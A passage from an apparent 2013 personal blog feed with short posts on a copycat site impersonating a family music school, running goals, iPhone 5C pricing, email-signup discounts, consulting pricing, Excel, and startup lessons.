    Create new versus add to existing contact. This is probably the most “first-world” one here but without knowing who is currently in your address book it’s impossible to know whether you want to create a new contact or update an existing and contact. My current approach is to choose add to existing, realize that I actually don’t have that contact in my address book, and then go back a few screens and choose create new. A common database operation is “insert or update” - insert if it doesn’t already exist and update if it does. I’d love to have something like that to manage my address book.
  </li>
</ol>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What the SEO?</title>
   <link href="http://dangoldin.com/2013/10/20/what-the-seo/"/>
   <updated>2013-10-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/20/what-the-seo</id>
   <content:encoded><![CDATA[
<p>My mom owns a small local business in suburban NJ, <a href="http://www.doremi-nj.com/" target="_blank">The Do Re Mi School</a>, that’s akin to an after-school program where music, dance, art, language and math is taught. Being surrounded by a family of engineers, we’ve been helping her on the tech side and my brother created the web site she’s been using it for the past couple of years. It’s based on Drupal and allows her to make changes without having to dive into the tech details. This approach has been working well she’s recently started using YouTube, Facebook, and Twitter to help with her marketing and social efforts.</p>

<p>Earlier this week, she sent an email saying there was a new website, bestnewjerseyartsschool.com, that was completely ripping off her site. They claim to be Do Re Mi and have copied various parts of the content, including paragraphs of text and various images. They’ve even created a YouTube video, www.youtube.com/watch?v=lvE6tBl8xU4 that’s embedded on the site’s home page.</p>

<p>Looking at the whois and dns info doesn’t reveal much since they’re using a privacy protection service. All I know is that the domain was registered in April using WildWestDomains, is protected by DomainsByProxy, and that the name servers are under <a href="http://hbuse.com/" target="_blank" rel="nofollow">hbuse.com</a> which claims to be “Hosting by unbelievably sweet elepehants” and yet doesn’t contain any real content and is not in Google’s index. The interesting thing is that looking at the whois info for hbuse.com indicates it was registered by someone with a PO Box in Nevada with an email address that also seems to be anonymyzed. I found a site, <a href="http://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank">yougetsignal</a>, that allowed me to search for other sites that were all hosted on “hbuse.com” and came up with a list of ~270 sites that all look to be site rip offs. They all seem to follow a pattern of having the location, the service, and possibly an adjective (best being the most common). Below’s a screenshot of some of the sites that I found sharing the host.</p>

<img src="http://dangoldin.com/assets/static/images/hbuse-sample-sites.png" alt="hbuse.com Hosted Sites Sample" width="749" height="755" layout="responsive"/>

<p>I don’t know what the motivation behind these. They are all running adsense so I suspect part of it just a way to generate easy ad revenue but the more cynical part of me thinks it’s a way to blackmail the existing sites into buying these fake domains to avoid SEO penalties.</p>

<p>It’s terrible that honest business owners have to deal with these things. They don’t have the background to know what to do and many are not even aware that their brands are being manipulated, damaged, and monetized. There’s also an SEO risk that these rip-off sites will start dominating the search results and hurting business even more. And since these sites are using AdSense, Google is able to generate more revenue.</p>

<p>I’d love to know what I should do next but my current thinking is that I should send a DMCA takedown notice for my mom’s site and report this entire list of rip-off sites to Google and hope that they stop AdSense from running on the sites and remove them from search results.</p>

<p>I worry that as it becomes easier and easier to generate written content using software we’ll see more and more of these scenarios where it’s going to become increasingly difficult to find the source of the original content and real site owners are hurt.</p>

<p>Update: So the way my mom discovered this other site is because she got a notice from Getty images that she was using one of their images without licensing it. When she asked which image they sent her a link to that other site that has her contact info on it. I guess that answers the question as to why that other site still uses the actual contact information.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>But I don't have time</title>
   <link href="http://dangoldin.com/2013/10/14/but-i-dont-have-time/"/>
   <updated>2013-10-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/14/but-i-dont-have-time</id>
   <content:encoded><![CDATA[
<p>I’m frustrated by the expression “I don’t have time”. As my friends and I have gotten older, I’ve been hearing it more and more frequently. I’ve even caught myself using when trying to come up with an excuse when coordinating evening or weekend plans.</p>

<p>The reason I dislike the phrase is that it’s equivalent to saying “it’s not a priority” and yet we phrase it such that we convince ourselves it’s something outside our control rather than due to the choices we make. I could go out until 3 AM if I make that a priority over running 6 miles in the morning before heading to work just like I could go catch a movie  instead of working on a side project. If we expressed our choices in terms of priorities rather than time we’d be more likely to deal with them.</p>

<p>Life is full of constraints and it’s impossible to do everything we want. This will only get worse as we get older and deal with more “grown-up” things. Better to develop the right mindset now rather than realize it later.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My running progress</title>
   <link href="http://dangoldin.com/2013/10/13/my-running-progress/"/>
   <updated>2013-10-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/13/my-running-progress</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/runkeeper-goal-2013.png" alt="My Running Goal" width="669" height="316" layout="responsive"/>

<p>I’m not entirely sure why, but I started off 2013 with the goal of running 1000 miles which breaks down into a little more than 19 miles a week. Remarkably, I stuck with it and am somehow at 822 miles for the year and need to average 16/week for the remainder of 2013 to hit the goal. Yet it took me a surprisingly long time to work up to a weekly distance of 19 miles and even longer to consistently run more than 19 miles a week. My first run was less than 1.5 miles and I only started consistently eat into my deficit in June. It took me until the end of August to actually reach the 19 mile cumulative weekly average I need to maintain until the end of the year. It’s been an awesome adventure and I’ve even managed to run three half marathons and improved my time from 1:58:11 on an easy course to 1:56:11 on a challenging one. Here’s a table I put together showcasing my running progress over the course of the year. I’ll update it at the end of the year after hopefully achieving the 1000 mile goal.</p>

<table class="table"><thead><tr><th>Week #</th><th>Start of Week</th><th>Cum Dist Needed</th><th>Dist Ran</th><th>Cum Dist Ran</th><th>Cum Run Avg</th></tr></thead><tbody><tr><td>1</td><td>1/1/2013</td><td>19.23</td><td>5.43</td><td>5.43</td><td>5.43</td></tr><tr><td>2</td><td>1/8/2013</td><td>38.46</td><td>11.94</td><td>17.37</td><td>8.69</td></tr><tr><td>3</td><td>1/15/2013</td><td>57.69</td><td>13.65</td><td>31.02</td><td>10.34</td></tr><tr><td>4</td><td>1/22/2013</td><td>76.92</td><td>11.88</td><td>42.90</td><td>10.73</td></tr><tr><td>5</td><td>1/29/2013</td><td>96.15</td><td>12.64</td><td>55.54</td><td>11.11</td></tr><tr><td>6</td><td>2/5/2013</td><td>115.38</td><td>19.16</td><td>74.70</td><td>12.45</td></tr><tr><td>7</td><td>2/12/2013</td><td>134.62</td><td>15.64</td><td>90.34</td><td>12.91</td></tr><tr><td>8</td><td>2/19/2013</td><td>153.85</td><td>0.00</td><td>90.34</td><td>11.29</td></tr><tr><td>9</td><td>2/26/2013</td><td>173.08</td><td>25.24</td><td>115.58</td><td>12.84</td></tr><tr><td>10</td><td>3/5/2013</td><td>192.31</td><td>24.27</td><td>139.85</td><td>13.99</td></tr><tr><td>11</td><td>3/12/2013</td><td>211.54</td><td>3.31</td><td>143.16</td><td>13.01</td></tr><tr><td>12</td><td>3/19/2013</td><td>230.77</td><td>7.09</td><td>150.25</td><td>12.52</td></tr><tr><td>13</td><td>3/26/2013</td><td>250.00</td><td>12.60</td><td>162.85</td><td>12.53</td></tr><tr><td>14</td><td>4/2/2013</td><td>269.23</td><td>7.89</td><td>170.74</td><td>12.20</td></tr><tr><td>15</td><td>4/9/2013</td><td>288.46</td><td>18.54</td><td>189.28</td><td>12.62</td></tr><tr><td>16</td><td>4/16/2013</td><td>307.69</td><td>12.80</td><td>202.08</td><td>12.63</td></tr><tr><td>17</td><td>4/23/2013</td><td>326.92</td><td>11.62</td><td>213.70</td><td>12.57</td></tr><tr><td>18</td><td>4/30/2013</td><td>346.15</td><td>21.60</td><td>235.30</td><td>13.07</td></tr><tr><td>19</td><td>5/7/2013</td><td>365.38</td><td>26.67</td><td>261.97</td><td>13.79</td></tr><tr><td>20</td><td>5/14/2013</td><td>384.62</td><td>25.10</td><td>287.07</td><td>14.35</td></tr><tr><td>21</td><td>5/21/2013</td><td>403.85</td><td>12.03</td><td>299.10</td><td>14.24</td></tr><tr><td>22</td><td>5/28/2013</td><td>423.08</td><td>13.73</td><td>312.83</td><td>14.22</td></tr><tr><td>23</td><td>6/4/2013</td><td>442.31</td><td>26.14</td><td>338.97</td><td>14.74</td></tr><tr><td>24</td><td>6/11/2013</td><td>461.54</td><td>23.71</td><td>362.68</td><td>15.11</td></tr><tr><td>25</td><td>6/18/2013</td><td>480.77</td><td>32.66</td><td>395.34</td><td>15.81</td></tr><tr><td>26</td><td>6/25/2013</td><td>500.00</td><td>19.94</td><td>415.28</td><td>15.97</td></tr><tr><td>27</td><td>7/2/2013</td><td>519.23</td><td>23.51</td><td>438.79</td><td>16.25</td></tr><tr><td>28</td><td>7/9/2013</td><td>538.46</td><td>40.54</td><td>479.33</td><td>17.12</td></tr><tr><td>29</td><td>7/16/2013</td><td>557.69</td><td>35.68</td><td>515.01</td><td>17.76</td></tr><tr><td>30</td><td>7/23/2013</td><td>576.92</td><td>29.05</td><td>544.06</td><td>18.14</td></tr><tr><td>31</td><td>7/30/2013</td><td>596.15</td><td>37.82</td><td>581.88</td><td>18.77</td></tr><tr><td>32</td><td>8/6/2013</td><td>615.38</td><td>11.37</td><td>593.25</td><td>18.54</td></tr><tr><td>33</td><td>8/13/2013</td><td>634.62</td><td>33.23</td><td>626.48</td><td>18.98</td></tr><tr><td>34</td><td>8/20/2013</td><td>653.85</td><td>16.83</td><td>643.31</td><td>18.92</td></tr><tr><td>35</td><td>8/27/2013</td><td>673.08</td><td>34.41</td><td>677.72</td><td>19.36</td></tr><tr><td>36</td><td>9/3/2013</td><td>692.31</td><td>27.70</td><td>705.42</td><td>19.60</td></tr><tr><td>37</td><td>9/10/2013</td><td>711.54</td><td>34.76</td><td>740.18</td><td>20.00</td></tr><tr><td>38</td><td>9/17/2013</td><td>730.77</td><td>9.19</td><td>749.37</td><td>19.72</td></tr><tr><td>39</td><td>9/24/2013</td><td>750.00</td><td>32.75</td><td>782.12</td><td>20.05</td></tr><tr><td>40</td><td>10/1/2013</td><td>769.23</td><td>23.66</td><td>805.78</td><td>20.14</td></tr><tr><td>41</td><td>10/8/2013</td><td>788.46</td><td>16.40</td><td>822.18</td><td>20.05</td></tr><tr><td>42</td><td>10/15/2013</td><td>807.69</td><td>0.00</td><td>822.18</td><td>19.58</td></tr><tr><td>43</td><td>10/22/2013</td><td>826.92</td><td>0.00</td><td>822.18</td><td>19.12</td></tr><tr><td>44</td><td>10/29/2013</td><td>846.15</td><td>0.00</td><td>822.18</td><td>18.69</td></tr><tr><td>45</td><td>11/5/2013</td><td>865.38</td><td>0.00</td><td>822.18</td><td>18.27</td></tr><tr><td>46</td><td>11/12/2013</td><td>884.62</td><td>0.00</td><td>822.18</td><td>17.87</td></tr><tr><td>47</td><td>11/19/2013</td><td>903.85</td><td>0.00</td><td>822.18</td><td>17.49</td></tr><tr><td>48</td><td>11/26/2013</td><td>923.08</td><td>0.00</td><td>822.18</td><td>17.13</td></tr><tr><td>49</td><td>12/3/2013</td><td>942.31</td><td>0.00</td><td>822.18</td><td>16.78</td></tr><tr><td>50</td><td>12/10/2013</td><td>961.54</td><td>0.00</td><td>822.18</td><td>16.44</td></tr><tr><td>51</td><td>12/17/2013</td><td>980.77</td><td>0.00</td><td>822.18</td><td>16.12</td></tr><tr><td>52</td><td>12/24/2013</td><td>1,000.00</td><td>0.00</td><td>822.18</td><td>15.81</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Decline of cynicism</title>
   <link href="http://dangoldin.com/2013/10/12/decline-of-cynicism/"/>
   <updated>2013-10-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/12/decline-of-cynicism</id>
   <content:encoded><![CDATA[
<p>As I’ve gotten older and most likely more mature, I’ve become far less cynical. I used to be dismissive of people trying to improve things and believed that they were just wasting their time and nothing would change. Yet as a I’ve gotten older I’ve come to appreciate this effort even if it doesn’t lead to noticeable progress.</p>

<p>The fact that someone is working for their beliefs should be applauded. The waste is dismissing others’ work while sitting in front of a computer or a TV. We all want to see progress and yet we exert effort belittling others that are actually committed to making things better. If we applied this effort into our own passions we’d be all be much better off.</p>

<p>Teddy Roosevelt said this better than I ever could:</p>

<blockquote>It is not the critic who counts; not the man who points out how the strong man stumbles, or where the doer of deeds could have done them better. The credit belongs to the man who is actually in the arena, whose face is marred by dust and sweat and blood; who strives valiantly; who errs, who comes short again and again, because there is no effort without error and shortcoming; but who does actually strive to do the deeds; who knows great enthusiasms, the great devotions; who spends himself in a worthy cause; who at the best knows in the end the triumph of high achievement, and who at the worst, if he fails, at least fails while daring greatly, so that his place shall never be with those cold and timid souls who neither know victory nor defeat.
</blockquote>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some JavaScript Tools</title>
   <link href="http://dangoldin.com/2013/10/05/some-javascript-tools/"/>
   <updated>2013-10-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/05/some-javascript-tools</id>
   <content:encoded><![CDATA[
<p>Over the course of this year, I’ve been writing two posts a week and been running into various formatting/design issues, two of which I finally dealt with earlier this week. One was embedding an Excel table into a blog post and the other was creating a BCG style “growth-share” matrix.</p>

<p>To convert a table from Excel to HTML I would write Excel formulae that would wrap each cell in a &lt;td&gt; tag and then wrap each row in a &lt;tr&gt;tag. I’d then copy and paste the result into the text editor to add the header row and finish up the styling. To generate a growth-share matrix, I’d just use Google Drawing or Keynote to draw the axes and labels before taking a screenshot and cropping it into a square.</p>

<p>The solution to these was a bit of JavaScript with some help from <a href="http://stackoverflow.com/questions/1293147/javascript-code-to-parse-csv-data" target="_blank">StackOverflow</a>. These tools are hosted on <a href="https://github.com/dangoldin/js-tools" target="_blank">GitHub</a> and accessible via <a href="https://dangoldin.github.io/js-tools/">https://dangoldin.github.io/js-tools/</a> and are under the MIT License. As I run into more of these I’ll keep on adding various tools to this list. If you have any suggestions or want to add your own let me know.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why's the iPhone 5C so expensive?</title>
   <link href="http://dangoldin.com/2013/10/01/whys-the-iphone-5c-so-expensive/"/>
   <updated>2013-10-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/10/01/whys-the-iphone-5c-so-expensive</id>
   <content:encoded><![CDATA[
<p>Many people <a href="http://ben-evans.com/benedictevans/2013/9/5/the-price-of-the-5c" target="_blank">expected</a> the iPhone 5C to be priced low in order to compete with the cheaper Android phones in countries without carrier subsidies. The news that the 5C’s starting price was $549 left many in the tech community <a href="http://www.avc.com/a_vc/2013/09/reactions.html" target="_blank">surprised and concerned</a> with many believing that the price needed to be lower than $400 in order to compete worldwide.</p>

<p>I'm definitely speculating but I believe the reason for such a high price for the 5C was to avoid cannibalizing the sales of the 5S while also framing the comparison to be iPhone vs iPhone instead of iPhone vs Android. When people go smartphone shopping they see that the 5S is “only” $100 more than the 5C and pay the difference for the more premium product. If the 5C were significantly cheaper people would be comparing it to a similarly priced Android phone which may encourage them to go with the Android or they'd compare it against the 5S which would get many to purchase the much cheaper 5C instead.</p>

<p><a href="http://www.localytics.com" target="_blank">Localytics</a> put together a <a href="http://www.localytics.com/blog/2013/china-leads-the-pack-in-preference-for-iphone-5s-over-5c/" target="_blank">great chart</a> showing the share difference between the 5S and the 5C which supports this view. The 5S is outselling the 5C in every country by a large margin. And although Apple could get higher sales volume with a cheaper 5C, I believe that the cannibalization of the 5S and the reduction in margins would have made Apple less profitable overall. At the same time., charging a lower price for the 5C to get more market share at the cost of profit may have been the right long-term decision.</p>

<p>
	<a href="http://www.localytics.com/blog/2013/china-leads-the-pack-in-preference-for-iphone-5s-over-5c/" target="_blank">
		<img src="http://dangoldin.com/assets/static/images/iphone-5s-5c-shares.png" alt="iPhone 5S vs 5C share by country" width="1024" height="522" layout="responsive"/>
	</a>
</p>

<p>Pricing products that are sold worldwide is a tough problem since every country has its own economic environment with unique shopping behaviors. This challenge is magnified for products that can easily be bought in one country and resold in another. The opportunities also vary significantly: the US is a mature smartphone market where carrier subsidies exist and make the buyer less price sensitive while in China many people are getting smartphones for the first time and lack carrier subsidies that will help reduce the initial sale price. We’ll just have to wait to see whether this was the right pricing decision.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/economist-pricing.jpg" alt="Economist decoy effect pricing" width="432" height="337" layout="responsive"/>
</div>

<p>Note: This reminded me a pricing table the Economist had a while back that looked like an error. There were three options: 1) a web-only subscription for $59, 2) a print subscription for $125, and 3) a print and web subscription for $125. In this case, the last two options were the same price but option 3 offered more value so it was clearly better than option 2. Yet by having option 2, the Economist got people to compare option 3 against option 2 rather than option 3 against option 1. This phenomenon is called the “<a href="http://en.wikipedia.org/wiki/Decoy_effect" target="_blank">Decoy effect</a>” and worth understanding, especially if you’re a marketer.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Going rate for an email address</title>
   <link href="http://dangoldin.com/2013/09/30/going-rate-for-an-email-address/"/>
   <updated>2013-09-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/30/going-rate-for-an-email-address</id>
   <content:encoded><![CDATA[
<div class="row">
	<div class="span5">
		<p>
A couple of months ago I started noticing popups on various ecommerce sites offering a first purchase discounts in exchange for entering an email address. Every time I noticed this happening I took a screenshot to track the offer and compile a list of the retailers using this approach. I’m still collecting examples and would more of them but so far the going rate seems to be anywhere from 10 to 25% off the first order. The pitch is pretty compelling and I think most people would gladly give up their email for the possibility of a discount. I’d also love to know what impact the magnitude of the discount has on the sign up rates; I suspect it’s minimal but definitely better than gaining entry to a sweepstakes or a lottery.
		</p>
	</div>
	<div class="span2">
<table class="table"><thead><tr><th>Company</th><th> Offer</th></tr></thead><tbody><tr><td>Ann Taylor</td><td>Lottery</td></tr><tr><td>Blue Nile</td><td>Lottery</td></tr><tr><td>Bonobos</td><td>20%</td></tr><tr><td>Gap</td><td>25%</td></tr><tr><td>Wayfair</td><td>10%</td></tr><tr><td>West Elm</td><td>10%</td></tr><tr><td>Williams-Sonoma</td><td>10%</td></tr></tbody></table>
	</div>
</div>

<ul class="thumbnails">
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-anntaylor.png" alt="Ann Taylor" width="800" height="484" layout="responsive"/>
      <p>Ann Taylor offers the chance to win a vacation</p>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-bluenile.png" alt="Blue Nile" width="800" height="484" layout="responsive"/>
      <p>Blue Nile offers the chance to win a diamond</p>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-bonobos.png" alt="Bonobos" width="800" height="456" layout="responsive"/>
      <p>Bonobos offers 20% off your first purchase</p>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-gap.png" alt="Gap" width="800" height="484" layout="responsive"/>
      <p>Gap offers 25% off your first purchase</p>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-wayfair.png" alt="Wayfair" width="800" height="480" layout="responsive"/>
      <p>Wayfair offers 10% off your first purchase</p>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-west-elm.png" alt="West Elm" width="800" height="513" layout="responsive"/>
      <p>West Elm offers 10% off your first purchase</p>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/discount-williams-sonoma.png" alt="Williams-Sonoma" width="800" height="454" layout="responsive"/>
      <p>Williams-Sonoma offers 10% off your first purchase</p>
    </div>
  </li>
 </ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Pricing small consulting projects</title>
   <link href="http://dangoldin.com/2013/09/28/pricing-small-consulting-projects/"/>
   <updated>2013-09-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/28/pricing-small-consulting-projects</id>
   <content:encoded><![CDATA[
<p>I’ve been doing some consulting work over the few months and wanted to share a pricing model that’s been working well for smaller projects. I’ll sit down with the client to understand the scope of the project and work with them to break it down into smaller, more manageable components. Based on this break down, I’ll estimate the time required for each piece and come up with an estimated total time. I charge my usual hourly rate for the work that falls within the estimated time but will charge a steeply discounted rate for every hour that goes over.</p>

<p>This aligns incentives since it gives me an incentive to complete the work within the estimated time and helps the client feel more comfortable that the project won’t run past its estimate for the sake of me working more hours. The other major benefit is that it forces us to scope out the project together so we’re both on the same page and avoid any future surprises.</p>

<p>I don’t think this approach would work well for larger projects since those are significantly more difficult to estimate but any feature can be broken down this way. For larger projects, I think trying to bill weekly as <a href="https://training.kalzumeus.com/newsletters/archive/consulting_1" target="_blank">advocated by Patrick</a> is the right approach if you’re able to agree with the client on it. In my case, I have multiple projects going on simultaneously so it’s been difficult getting a weekly rate worked out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In defense of Excel</title>
   <link href="http://dangoldin.com/2013/09/20/in-defense-of-excel/"/>
   <updated>2013-09-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/20/in-defense-of-excel</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/excel-logo-2013.png" alt="Excel 2013 logo" width="256" height="256" layout="responsive"/>
</div>

<p>Excel has developed a reputation of being bloated, slow, error prone and used primarily by “business people” who don’t have real quantitative skills. Just like anything else, Excel is a tool that can be misused but is significantly more useful than people give it credit for.</p>

<p>The most important benefit Excel provides is making data approachable and fun. By making it approachable Excel opens up data analysis to a ton of new people that come into it with their own experience and knowledge. Sure they may not have data scientist skills but they’re still able to run some neat analyses and derive useful insights.</p>

<p>The fun makes it very easy to experiment and try a lot of different ideas by making the cost of failure so low by providing quick feedback and visuals. The value of writing a formula and then dragging it down, quickly seeing the calculations is massive. This gives the quick feedback that encourages people to keep on driving their analysis. And although Excel’s visualizations are simple, they provide a fast way to visualize the data and hopefully lead to more analysis. Similar to the way we use Python for a quick project instead of Java, it’s much easier to run a quick analysis in Excel than in a “real” language such as R.</p>

<p>My typical approach to quantitative problem is to write a query to retrieve the data I want and then immediately dump it into Excel for a quick analysis. This lets me apply some pretty basic formulae and visualizations to to see if there’s anything worth pursuing in more depth. Only then will I move to R or Python to do a deeper analysis. Even then, I most likely rewrite the code to make it ready for production. This approach forces me to focus on the data and dimensions I want to analyze. Excel only serves as a way to quickly explore the data before deciding whether there’s anything worth pursuing.</p>

<p>The only tool I can think of that comes close is <a href="http://www.tableausoftware.com/" target="_blank">Tableau</a> but my experience has been that it has a somewhat steeper learning curve and doesn’t support the flexibility to quickly add and adjust various calculations. Replacing Excel is tough. I use Google Docs for working with documents and yet for my data I use Excel rather than Google Spreadsheets.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Programming and math</title>
   <link href="http://dangoldin.com/2013/09/17/programming-and-math/"/>
   <updated>2013-09-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/17/programming-and-math</id>
   <content:encoded><![CDATA[
<p>The tech world is conflicted about how much math a developer needs. Engineers working on quantitative systems or data science clearly require advanced math and there are also countless engineering roles where math is unnecessary. My experience is that even if you don’t use math, having a mathematical mindset makes you significantly more productive. You’re able to quickly estimate the complexity of various tasks and hone your intuition. You’re also able to quickly recognize patterns when refactoring, especially when working in a functional language. A basic understanding of probability and statistics is a great way to analyze the performance of your code as well as help you model and understand your application behavior. I wanted to share a quick story of how a mathematical approach came in handy when working on Pressi.</p>

<p>First, a little bit of background. <a href="http://getpressi.com" target="_blank">Pressi</a> is a social media mashup page that takes the content a user posted across a variety of social media networks and creates a “Flipboard” style web page to showcase it. At launch, we had a simple cron job that would run every hour and pull new data for each of our users. Over time, we migrated to a task system that let us run these retrieval tasks in parallel and split across multiple machines. Using this approach, we were able to scale well and handle the increased volume but our hosting costs saw a big jump so we went looking for a solution.</p>

<p>Luckily for us, we tracked the history of each social network data pull (containing user, network, datetime, and # of items pulled) and doing a quick query told us that close to 92% of our requests resulted in no data being retrieved. The intuition behind this is that most people will not be posting on every social network every hour. By eliminating these calls we’d be able to drastically cut our hosting costs.</p>

<p>This analysis got us thinking about the ideal case which is for us to pull a moment immediately after it’s posted. One way to achieve it was to leverage the push updates that some of the social networks supported but we wanted to find a more general way that could tell us when we should pull the data for a particular user/network pair.</p>

<p>To figure this out, we looked at another distribution: the average number of moments shared by a user on a network per day. This let us look at the number of users who were extremely active on social media down to the users that pretty much only had accounts. We then dumped this data into Excel in order to come up with ranges that we’d use to segment our user/network pairs in order to see how often we should attempt to pull their data. For example, a user that on average posted 20 updates a day on Facebook would have their Facebook data pulled every 4 hours but a user who posted on Instagram less than once a day would have their data pulled once a day. This also gave us a way to estimate how many fewer calls we’d need to make compared to what we were currently doing and therefore approximate the cost savings. The result of this update was that we dropped the number of useless requests from ~92% to just over 40%. This was by no means perfect but gave us improvement we needed. An additional update we modeled out but but didn’t get a chance to implement was to look at day of week and hourly patterns in order to identify when users were actually posting rather than treat every day and hour the same way. The data clearly showed that users had well defined schedules which would have led to another nice improvement.</p>

<p>The key lesson here was that we started by leveraging the data we collected to identify the major cause of our cost increase and then identified the metric we wanted to optimize. In our case it was to reduce the volume of empty requests we were making while making sure that we did not significantly increase the average number of moments that were retrieved for non empty calls. Otherwise, we could make 1 request a week for each user/network which would pretty much drop the number of useless requests to zero but blow up the number of average moments retrieved per call. We could have chosen a variety of other metrics but went with this one since it was intuitive, easy to model, and easy to test. The other neat property is that it’s self correcting so if a user changes their behavior on a particular network we’d shift them into another bucket.</p>

<p>None of the math we used was very complicated and although we tried playing around with a few statistical distributions to model out the user posting behavior we ended up quickly abandoning those when we saw the impact we’d get from a simple approach. I’d bet that almost every code base has something that can be improved with a little bit of mathematical analysis.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Offering suggestions</title>
   <link href="http://dangoldin.com/2013/09/16/offering-suggestions/"/>
   <updated>2013-09-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/16/offering-suggestions</id>
   <content:encoded><![CDATA[
<p>Since becoming active in the startup scene, I’ve been meeting a ton of founders and am annoyed by how much easier it is to offer suggestions than to apply them to myself. My most common suggestion, in true lean startup fashion, is to advocate a quicker or cheaper way to validate the market before building a product and yet it’s extremely difficult to take my own advice. I’ve been working on <a href="http://better404.com" target="_blank">Better404</a> on and off for two months now and know I should get it in front of potential customers and yet I keep on making minor tweaks and updates to the product.</p>

<p>I’m not sure if this is due to how much easier it is to say something versus executing it or just a fear of failure but it’s something I’m becoming more and more aware of. At least now I’m aware of this bias and and can work on correcting it. What’s been working well so far is coming up with a framework that can be used to evaluate a startup in a similar space and then using it to evaluate my own. The challenge is coming up with the framework without biasing it knowing that you will be using it to evaluate your own project. Nonetheless, this additional indirect step does help.</p>

<p>I’ve been looking at other SaaS businesses and listing what they could be doing better and what they’re doing well as well as what I’d do if I were in their situation. Having a concrete target for this sort of analysis is a great way to come up with a large number of specific suggestions and although many of these aren’t relevant a few can be applied to what I’m working on.</p>

<p>To succeed, it’s critical to be able to look at your startup from an unbiased, external perspective. This is even more true as a solo founder since there’s no one else bringing their own ideas and experiences. I’d love to know how others are overcoming this.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>MoMath visit</title>
   <link href="http://dangoldin.com/2013/09/11/momath-visit/"/>
   <updated>2013-09-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/11/momath-visit</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/momath-logo.gif" alt="MoMath logo" width="600" height="607" layout="responsive"/>
</div>

<p>Although I’ve been meaning to visit the <a href="http://momath.org/" target="_blank">Museum of Math</a> ever since it opened in December, I only got the chance to do it this Labor Day. I wanted to share my thoughts and encourage everyone who can to visit.</p>

<p>I love the mission. Math should not be taught in a vacuum and having various activities that each showcase different mathematical properties is a great approach to get kids (and adults) engaged while learning some math. Some of the activities that stood out to me were bikes with differently sized square wheels that can only go around a certain diameter track; a “helix” shape that explains multiplication by lighting up a fiber between the numbers and highlighting the resulting value; and a fractal tree generator that would use your body to create the trunk and branches. I enjoyed these since they had an interactive physical component that provided immediate feedback.</p>

<p>There were also a bunch of activities that were primarily software based. Two examples are a “kaleidoscope” drawing tool and an app that explores 3D shapes and functions by letting you tweak the parameters. These weren’t very engaging and most were abandoned quickly. In addition, some of the tools either had broken sensors or were buggy which made them less fun than they should have been.</p>

<p>A museum should not be able to replaced with iPad apps and MoMath places too much emphasis on the software. They should move away from these apps and focus on the physical exploratory activities that cannot be recreated at home. I found that there was very little continuity between the exhibits and wish they did a better job curating so that lessons from one could be applied to another. This would limit the breadth but would make the experience more valuable. Similar to an art museum, they could have a base collection that never changes as well as exhibits that rotate every couple of months.</p>

<p>The museum has been open for less than a year and I’m optimistic it will only improve. I only wish there were more math museums opening up.</p>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Want more sales? Start teaching</title>
   <link href="http://dangoldin.com/2013/09/06/want-more-sales-start-teaching/"/>
   <updated>2013-09-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/06/want-more-sales-start-teaching</id>
   <content:encoded><![CDATA[
<p>A trend I’ve been seeing lately is companies boosting their sales by focusing on customer education. The successful companies don’t just focus on the results their product will deliver but also spend time explaining why those results are important and how the product works and how it can be used.</p>

<p>This approach seems obvious to me. Borrowing some terminology from <a href="http://en.wikipedia.org/wiki/Crossing_the_Chasm" target="_blank">Crossing the Chasm</a>, the early adopters will use your product as long as it solves an existing problem but education will help the remaining, slower adopting customer segments discover that they even have a problem and look to you for a solution. In my opinion, the major benefits of customer education are to reduce acquisition costs and improve retention. Acquisition costs will drop as you start relying more on inbound interest rather than on outbound sales. Retention will increase since customers that sign up willingly will stick around longer than customers who needed to be coaxed into it by a sales rep. These “self serve” customers will also be more likely to blame themselves when encountering problems rather than whoever got them to sign up. In addition, by developing original and useful content you’ll help your SEO score which will drive more potential customers to look at your products. Your trustworthiness will also improve since you’ll be offering free and useful knowledge.</p>

